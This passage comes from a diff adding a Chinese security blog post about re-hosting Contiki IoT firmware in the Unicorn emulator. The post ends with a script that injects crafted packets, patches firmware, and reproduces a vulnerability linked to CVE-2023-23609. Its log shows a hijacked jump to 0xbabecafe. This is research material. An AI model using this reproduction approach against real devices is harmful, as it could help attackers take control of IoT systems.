+                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body_2</span><span class="p">[</span><span class="n">packet_injected_2</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="n">packet_injected_2</span> <span class="o">+=</span> <span class="mi">1</span>
+
+        <span class="k">elif</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected_3</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body_3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">packet_injected_3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body_3</span><span class="p">)))</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body_3</span><span class="p">[</span><span class="n">packet_injected_3</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="n">packet_injected_3</span> <span class="o">+=</span> <span class="mi">1</span>
+
+        <span class="k">elif</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">&gt;=</span> <span class="mi">4</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">&lt;=</span><span class="mi">7</span> <span class="ow">and</span> <span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">])</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">])))</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">][</span><span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+
+
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">])</span>   <span class="c1"># to bypass sys_ctrl_init, random_init</span>
+            <span class="c1"># print(f&#34;content: {mu.mem_read(address, 4)}, ready to write random: {r}&#34;)</span>
+            <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_ARM</span><span class="p">,</span> <span class="n">UC_MODE_THUMB</span><span class="p">)</span>
+
+    <span class="c1"># memory regions</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">REGION_START</span><span class="p">,</span> <span class="n">REGION_SIZE</span><span class="p">)</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="mh">0xe0000000</span><span class="p">,</span> <span class="mh">0x10000000</span><span class="p">)</span> <span class="c1"># NVIC</span>
+
+    <span class="c1"># load ROM</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;hello-world.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+    <span class="c1"># write memory / patch code</span>
+    <span class="c1"># TODO: maybe some patching needed?</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210926</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\xBD</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># patch fade, POP {R4-R6,PC}</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210768</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\x47</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># patch wfi</span>
+    <span class="c1"># why not push pc, or mov pc,lr</span>
+
+    <span class="c1"># init SP</span>
+    <span class="n">init_sp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
+    <span class="n">reset</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">init_sp</span><span class="p">)</span>
+    
+    <span class="c1"># hooks</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">hook_code</span><span class="p">)</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_BLOCK</span><span class="p">,</span> <span class="n">hook_block</span><span class="p">)</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_UNMAPPED</span><span class="p">,</span> <span class="n">hook_mem_unmapped</span><span class="p">)</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_READ</span><span class="p">,</span> <span class="n">hook_mem_read</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">,</span> <span class="mh">0x60000000</span><span class="p">)</span> <span class="c1"># MMIO read</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;reset:</span><span class="si">{</span><span class="n">reset</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">reset</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="c1"># print(a)</span>
+
+
+    <span class="c1"># interrupt(mu, 2, )</span>
+
+    <span class="c1"># TODO: run until</span>
+    <span class="c1"># 00210768  30bf       wfi</span>
+
+    <span class="c1"># TODO: inject RF data available IRQ</span>
+    <span class="c1"># TODO: reach input_l2cap_conn_req</span>
+    
+    <span class="c1"># TODO: use CVE-2023-23609 to overwrite:</span>
+    <span class="c1"># 200010e4  uint32_t notification_process = 0x0</span>
+    <span class="n">notification_process</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x200010e8</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;notification_process = </span><span class="si">{</span><span class="n">notification_process</span><span class="si">:</span><span class="s1">08x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x20001268</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">))</span>
+
+    <span class="c1"># TODO: inject irq 160 and crash firmware</span>
+
+<span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>实在是丑陋不堪，但是能用！</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">...
+[hook block] 0x203d6c, 2, None
+[hook block] 0x203d5a, 4, None
+Interrupted...
+[hook block] 0x205114, 24, None
+[hook block] 0x20512c, 6, None
+[hook block] 0x205132, 4, None
+[hook block] 0x2052e8, 2, None
+[hook block] 0x2052ea, 10, None
+0x2052F0: p-&gt;state - 1  0x0
+[hook block] 0x2052f6, 10, None
+[hook block] 0x2052f4, 2, None
+[hook block] 0x205136, 6, None
+ok
+[hook block] 0x205494, 8, None
+0x205498: poll_requested  1
+[hook block] 0x2054ac, 4, None
+[hook block] 0x2053d8, 14, None
+[hook block] 0x2053e8, 2, None
+[hook block] 0x2053ea, 6, None
+[hook block] 0x2053f0, 16, None
+[hook block] 0x205398, 10, None
+[hook block] 0x2053a2, 8, None
+[hook block] 0x2053aa, 14, None
+[hook_mem_unmapped] 21, babecafe, 4, 0, None
+0xbabecafe Bingo!!
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="结束了吗">结束了吗？</h2>
+<p>本文记录了初次使用 Unicorn，并在没有任何硬件的情况下对某物联网 OS 固件进行软件模拟，并复现某个较易利用的漏洞的过程。笔者对自己写的模拟代码相当不满意，其中也有不少地方可以深究。但目前打算暂放一下，希望几个月后回顾这篇文章时会觉得漏洞百出，依托答辩。收工！</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-09-27</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2023/09/re-host/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting 小记"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://xidoo.top/2023/09/re-host/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting 小记" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting 小记"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting 小记"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting 小记" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting 小记" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting 小记"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/05/rev_main/" class="prev" rel="prev" title="逆向方法论"><i class="fas fa-angle-left fa-fw"></i>逆向方法论</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">🏴‍☠️ Love it, Make magic</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">x1do0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":15},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
